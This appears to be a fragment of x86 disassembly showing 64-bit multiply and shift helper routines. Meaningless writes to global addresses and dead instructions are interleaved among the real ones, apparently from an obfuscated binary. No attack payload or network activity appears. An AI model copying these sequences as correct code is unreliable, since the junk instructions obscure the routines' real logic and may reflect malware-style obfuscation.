  421c11:	mov    eax,DWORD PTR [esp+0x8]
  421c15:	mov    ecx,DWORD PTR [esp+0x10]
  421c19:	or     ecx,eax
  421c1b:	mov    ecx,DWORD PTR [esp+0xc]
  421c1f:	jne    0x421c2e
  421c25:	mov    eax,DWORD PTR [esp+0x4]
  421c29:	mul    ecx
  421c2b:	ret    0x10
  421c2e:	push   ebx
  421c2f:	mul    ecx
  421c31:	mov    ebx,eax
  421c33:	mov    eax,DWORD PTR [esp+0x8]
  421c37:	mul    DWORD PTR [esp+0x14]
  421c3b:	add    ebx,eax
  421c3d:	mov    eax,DWORD PTR [esp+0x8]
  421c41:	mul    ecx
  421c43:	add    edx,ebx
  421c45:	pop    ebx
  421c46:	ret    0x10
  421c49:	adc    DWORD PTR ds:0x4282d1,0x428271
  421c53:	sub    DWORD PTR [ebp+0x10],0x1
  421c57:	cmp    DWORD PTR [ebp+0x10],0x0
  421c5b:	je     0x421c6e
  421c61:	add    DWORD PTR ds:0x4281b1,0x2f48
  421c6b:	add    esp,DWORD PTR [ebp-0x4c]
  421c6e:	mov    DWORD PTR [ebp-0x60],eax
  421c71:	mov    ebx,0xbfc
  421c76:	mov    eax,DWORD PTR [ebp-0x60]
  421c79:	pop    edi
  421c7a:	pop    esi
  421c7b:	pop    ebx
  421c7c:	leave  
  421c7d:	ret    0x10
  421c80:	mov    DWORD PTR ds:0x4281a9,0x6f6
  421c8a:	cmp    cl,0x40
  421c8d:	jae    0x421cd6
  421c93:	mov    DWORD PTR ds:0x4281a1,0x6da3
  421c9d:	cmp    cl,0x20
  421ca0:	mov    DWORD PTR ds:0x42820d,0x78a0
  421caa:	jae    0x421cb6
  421cb0:	shld   edx,eax,cl
  421cb3:	shl    eax,cl
  421cb5:	ret    
  421cb6:	neg    edx
  421cb8:	mov    edx,eax
  421cba:	adc    DWORD PTR ds:0x4281a1,0x428269
  421cc4:	xor    eax,eax
  421cc6:	and    DWORD PTR ds:0x4282c9,0x4281a9
  421cd0:	and    cl,0x1f
  421cd3:	shl    edx,cl
  421cd5:	ret    
  421cd6:	xor    eax,eax
  421cd8:	xor    edx,edx
  421cda:	ret    
